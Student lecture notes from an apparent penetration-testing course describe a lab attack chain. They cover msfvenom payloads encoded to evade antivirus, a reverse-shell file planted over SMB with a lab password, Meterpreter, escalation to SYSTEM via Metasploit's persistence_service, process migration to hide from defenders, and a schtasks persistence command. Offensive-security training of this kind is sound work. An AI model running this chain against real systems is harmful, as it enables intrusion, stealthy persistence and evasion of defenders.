**Intro to msfvenom**
**Payload:** Shell code that runs when an exploit successfully compromises a system 
- It is a virus 
- It can steal data 
- Changing pricing on items 
	- Finding where is your sources are from
- Can Mine morello (Bitcoin, crypto miner)
- Deliver malware

Mitigation from payload 
- Firewalls 
- Go to trusted sites

Attackers typically build custom payloads to include in phishing emails or add to their website
- When unsuspecting users click the link for the malicious payload, their computers are infected 

![[17.2.0.jpg]]
Any type of shells
- In order to create these payloads, attackers use msfvenom, a Metasploit a framework tool that generates and encodes payloads 
	- msfvenom is part of the Metasploit framework Metasploit does not need to be running in order to use msfvenom

It is simple to create a custom payload, the challenge is creating a payload that bypasses network detection by IDS and AV solutions
- **Encoding** to evade detection tool 
- It changes the signature of an exploit or payload, creating a new signature that has no written rule 
- This change in signature allows payloads to bypass detection from AV and IDS tools that detect known malicious signature 

____
Instructor demo: Custom Payload Creation with msfvenom
msfvenon -h 
- Tell you a options of msfvenom 

msfvenom -l payloads 
- List any payloads that we can generate 
	- Reverse_tcp 
- The type would be depending on the type you want to attack

msfvenom -l format 
- Type of files executable and transform format

shortcut-
revshells generator 
revshells.com 
- this will tell you how to generate 

bind vs a reverse shell 
Bind
- Initiated by the attacker's system listening for incoming connection on a specfic port 
- More complex tactics to establish and maintain 
Reverse 
- Initiated by victim's system receiving a command from the attacker's system

![[17.2.0.0.jpg]]
-p: type of payload 
reverse_tcp: Type of attack
LHOST: Listener 
LPORT: where to listen from 
-f: Type of file 
-o:
Note: this is the payload for msfvenom
![[17.2.0.1.jpg]]
-q quite mode
-x execute 
; helps you run multiple commands if it is not successful for not 
NOTE: This is what we want to listen from 

Create a new tab
$ smbclient //172.22.117.20/C$ -U megacorpone/tstark
- We want to connect to the subnetwork .20
	- Connect to their c$
	- C$ drive is like root 
- With megacorpone tstark 
	- The username: tstark
	- Passwrod: Password!

![[Put notavirus.jpg]]
Sharing files are HR, Management, etc.  
- This shows that we were able to put the virus into their account 

![[TstarkC$ 1.jpg]]
notavirus is in tstark c drive

![[metapreterTstark 2.jpg]]
Once we Tstark interact with the file 
- On his POV, Nothing will happen 
- on our POV, We are able to sign into meterpreter
	- If we run shell 
		- It will react as their window machine 
		- (We input whoami and resulted in Tstark)


![[Target5348.jpg]]
Run ps (powersell)
Migrate 6088
- sometimes it works sometimes it doesn't 
- We do not want to stay as 5352 because they can see if it is the hacker (So we can hide)
	- We can also run as a different ID 
	- Now we can run as svchost.exe
NOTE: It can be anyone that has Megacorpone/tstark

![[NoteOurID.jpg]]
Note: We are 4496 
- We are transferring to 6088


![[ls.jpg]]
Able to see the permissions for each files

![[UploadingMsfVenom.jpg]]
able to updload files 

![[Root FromTstark.jpg]]
We are able to become root from tstark 

![[sysinfomsfvenom.jpg]]
We can see the system info from the command 

![[Background session2.jpg]]
We were able to access session 2  
- When Tstark interact with notavirus

We are able to look at other sessions or anyone who interact with the virus 
- Then we can run cmds ask the infected computer 

___
![[17.2.1 1.jpg]]![[17.2.2 1.jpg]]
____
**Meterpreter**
Meterpreter is a program that uses normal shells but it has built in commands and pen testing features 
- Extendable command shell that provides the same interface across platform 
	- We can use meterpreter to;
		- Upload and download files to and from a target
		- set up port forwarding through the target
		- switch between meterpreter shells 
		- run metasploit modules on remote hosts 
- Diffcult to detect and leave minimal traces on victim machines or the network 
	- It run entirely in memory, meaning it does not create files on the target
	- It does not start any new process on the victim
		- Instead it *injects* otself into a program that's already running
			- meterpreter has started by looking at running process 
			- With SSDH session - it launches a new shell process 

**Meterpreter basic**
*Common payload;*
- windows/meterpreter/reverse_tcp 

The easiest way to open a Meterpreter shell is to select an exploit and set a meterpreter payload 

![[17.2.3.jpg]]
- Cmds are used to connect to meterpreter session 

![[17.2.4.jpg]]
- More CMD
____
**Privilege Escalation**
Windows, groups user belongs to determine their permission
- User: Default group all new local users are added to 
- Domain user: Default group a new domain user is added too
Note: Both groups are considered *low* permission and oly allow basic access, such as accessing the user's own home golder in C:\users\

![[17.2.5.jpg]]
There are several *privileged* groups in windows, both in a local and domain context, providing elevated privileges 
- IE; Memeber of the Domain Administrators group can create new users, reset passwords, and modify group policies 
- Note: this is considered a high-privelege group 

Two groups for privilege escalation 
- **Domain Administrators**: 
	- Group has very high privileges in Active Directory 
	- This allows the user to modify group polices, create users, set permission, etc
- **Administrators**
	- Local group for administrators
	- On local Windows 10 machine this allows the user to create new local users, assign them 3to local groups, reset password , etc 

![[17.2.6.jpg]]
- these are the 4 types of user groups 

![[Admincmd.jpg]]
Run as administration with command prompt 
- If you run a sadmin, you will have more access to data
- If you run normally, you have a lack of data 
**Local Administrator**
- Windows is a high-privilege role that also allow high access to operating system 
	- User may access any folders or files and modify the permission on them
- User tstark, under whose name we have a meterpreter session on the WIN 10 machine is a local administrator to WIN10 machine 
- TSTARK is only *Local* administrator, which means they do not have any administrative rights on any machines on the network aside from this WIN 10 Machine 
	- Note: Administrator group in Windows DOES NOT confer the highest privilege possible 

![[17.2.7.jpg]]
Modification of the system's configuration files 
- IE requires SYSTEM privilege 
	- This is Windows equivalent of root in LINUX
- Users can be assigned to administrator group in windows, there is no group for SYSTEM
- SYSTEM is technically the computer account 
	- Computer account always have full access to their own machines 
Red team / pen testers: First thing a pen tester should do is check their privilege
- Windows can accomplish in few ways;

**Method 1: PowerShell or cmd - whoami** 
		- name of the user you are logged in as 
	- Cmd whoami /priv 
		- will list the permission the user has 

**Method 2: In Meterpreter - getprivs**
![[Getpriv.jpg]]


**User Account Control and Token**
In Windows, Running a program as Administrator 
- UAC : Windows security feature that applies the principle of least privilege's, meaning that the only time administrative access should be used is when it is needed 
	- IE: Checking the IP address can be accomplished by any user but changing the IP address requires administrator privilege's 

**Split token**: they log on with standard user permission
- Administrator permission are not present until they specifically ask for them 
	- IE: Run a administrator 
- new access token is created and applied to whatever new process they created 
- NOTE: Some people have some permissions

___
**Privilege's Escalation Techniques in windows**
![[17.2.8..jpg]]
- Two paths to privilege's escalation 
- this is important because certain privilege escalation techniques are specific to a low-privilege user trying to escalate to a high-privilege user 

**Privilege's Escalation Techniques in windows**
- Services in Windows are crucial to the operating system running
- Several third-party programs require and depend to service to run 
- Service always run as SYSTEMS by default 

Default, administrator are allowed to create services, so our privilege escalation attack path is clearly defined;
1. As an administrator create a new service in windows
2. Tell the service to execute an executable of our choice, such as a meterpreter payload 
3. Start the service and listen for the payload callback in Metasploit 

___
Activity: Windows Privilege Escalation 
After running the msfvenom we are going to go to sessions 2 (to access tstark computer)
![[WindowsPrivEsca 1.jpg]]
$ run 
$ session 
$ background 
$ session 2 



![[payload privesca.jpg]]
$ Background
$ use exploit/windows/local/persistence_services
Refering this site 
https://www.rapid7.com/db/modules/exploit/windows/local/persistence_service/ 


![[sessions privesca.jpg]]
$ session
Note: LPORT 4444

use exploit/multi/handler
![[Multi.jpg]]
hit run (We are listening for people who are trying to run as administrator)

$ background
![[runasadmin.jpg]]
go to windows and righ click and run as administrator in tstark computer
- This will give us another meterpreter shell 
- If we run sessions, we can see another session that has run as administrator 

![[Privesca.jpg]]
go back to 
use exploit/windows/local/persistence_service
sessions
set session 3
set LHost 172.22.117.100
exploit 

![[Privesca1.jpg]]
running getuid
- this will tell us that we got from Tstark to SYSTEM 

___
**Process Migration**
Note: Once we are SYSTEM and have full access to the machine, we can explore *process migration*

**Process migration (Process injection)** : Moving the active process of C2 agent to another active process
- Note: Allows a current process to inject or migrate its data into another process
- Old process take the name of the new, migrated process

Two primary purpose of process migration 
- **Conceal** the identity of the C2 agent 
- **move** to a more stable process

**Migration example**
**Scenario 1:** 
![[17.2.9.jpg]]
- Name is very obvious to threat hunters insepcting the active processes on the machine 
- Many defense product will also recognize the name and quickly shut it down 

**Scenario 2:**
![[17.2.10.jpg]]
- Instead of meterpreter communicating from the process *payload.exe* it now communicate from *searchindexer.exe* because the content of *payload.exe* were migrate to *searchindexer.exe* 

**Process migration**
Adding a layer of stealth, process migration also improve the stability of the process; 
- Payload are often generated for a general OS and architecture 
	- IE: Windows x64
- These payloads do not take into account certain things, such as necessary DLLs in order to run properly 
- Migrating to another process that Windows has spawned, the payload becomes much more stable 

We can use many Techniques for process migration and injection. Base they are all similar and leverage the Windows API; 
1. open a handle to a target process
2. Allocate memory in the target process
3. Write the payload contents into the newly allocated section of memory in the target process
4. Run the new payload contents in the target process 

____
**Instructor Demo: Process Migration**

___
**Windows Persistence**
![[17.2.11.jpg]]
Concept and purpose of persistence is the same in windows as it is in Linux:
- Establishing a continuous method of access to compromised machine or network in case the initial connection is severed 

![[17.2.12.jpg]]
We can establish persistence by abusing task scheduler 
- Scheduled task in Windows are similar to *cronjob* in Linux; they are programmable task that can be executed at a defined interval 
	- By default, Windows has significantly more default scheduled task jobs created than Linux 
		- This makes it more predictable for Pen testers to blend in with existing scheduled task 
![[17.2.13.jpg]]

____
Instructor Demo: Windows Persistence
$ shell

![[Schtask 1.jpg]]
$ schtasks /create/f /tn notavirus /sc once /st 00:00 /TR quote C:\notavirus.exe quotes
schedule task 
create 
sc: Schdule 
st: Time (now)
Tr: Target file 


NOTE: We are creating an schedule where notavirus file is executing on a schedule 
___
Activity: Windows Persistence Activity

___
